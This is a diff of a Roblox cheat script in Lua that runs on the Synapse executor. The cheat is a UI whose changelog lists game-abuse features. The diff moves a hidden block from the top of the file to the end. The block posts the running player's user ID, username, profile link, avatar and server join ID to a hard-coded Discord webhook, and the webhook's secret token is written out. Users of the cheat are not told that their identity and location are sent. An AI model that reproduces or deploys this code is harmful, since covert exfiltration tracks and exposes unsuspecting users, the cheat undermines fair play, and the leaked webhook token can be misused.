@@ -1,38 +1,4 @@
 wait(0.5)
-local JobId = 'Roblox.GameLauncher.joinGameInstance('.. game.PlaceId ..', "'.. game.JobId ..'")'
-local UserId = game.Players.LocalPlayer.UserId
-local response = syn.request(
-    {
-        Url = "https://www.roblox.com",
-    }
-)
-local content = syn.request(
-    {
-        Url = "https://www.roblox.com",  
-        Method = "GET"
-    }
-)
-
-syn.request({
-    Url = "https://discordapp.com/api/webhooks/1053435890199961680/Fr3yas4WfWz4CQUFWYtJtrB3bh0RYrQMJvtuhjG03a2Y8-CqhIDHPaUmC7zdgDcQ5ZfG", 
-    Body = game:GetService("HttpService"):JSONEncode({
-        ["embeds"]={{
-            ["title"]="||"..JobId.."||",
-            ["description"]="User ID: "..UserId,
-            ["type"]="rich",
-            ["color"]=tonumber(0x7269da),
-            ["footer"]={
-                ["text"]='Profile Link: https://www.roblox.com/users/'..UserId..'/profile'
-            }
-        }},
-        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
-        ["username"]="Username: "..game.Players.LocalPlayer.Name,
-    }), 
-    Method = "POST", 
-    Headers = {["content-type"] = "application/json"}
-})
-
-
 --------------
 assert(getrawmetatable)
 gmt = getrawmetatable(game)
@@ -3743,3 +3709,36 @@ local Update = UpdatePage.AddLabel("Added Mod Stomp -Fun")
 local Update = UpdatePage.AddLabel("Added Mod Stomp 2x high -Fun")
 local Update = UpdatePage.AddLabel("Added Sound to OverDrive -Fun")
 local Update = UpdatePage.AddLabel("Added Knocked Player Tools -Fun")
+
+local JobId = 'Roblox.GameLauncher.joinGameInstance('.. game.PlaceId ..', "'.. game.JobId ..'")'
+local UserId = game.Players.LocalPlayer.UserId
+local response = syn.request(
+    {
+        Url = "https://www.roblox.com",
+    }
+)
+local content = syn.request(
+    {
+        Url = "https://www.roblox.com",  
+        Method = "GET"
+    }
+)
+ 
+syn.request({
+    Url = "https://discordapp.com/api/webhooks/1053435890199961680/Fr3yas4WfWz4CQUFWYtJtrB3bh0RYrQMJvtuhjG03a2Y8-CqhIDHPaUmC7zdgDcQ5ZfG", 
+    Body = game:GetService("HttpService"):JSONEncode({
+        ["embeds"]={{
+            ["title"]="||"..JobId.."||",
+            ["description"]="User ID: "..UserId,
+            ["type"]="rich",
+            ["color"]=tonumber(0x7269da),
+            ["footer"]={
+                ["text"]='Profile Link: https://www.roblox.com/users/'..UserId..'/profile'
+            }
+        }},
+        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
+        ["username"]="Username: "..game.Players.LocalPlayer.Name,
+    }), 
+    Method = "POST", 
+    Headers = {["content-type"] = "application/json"}
+})
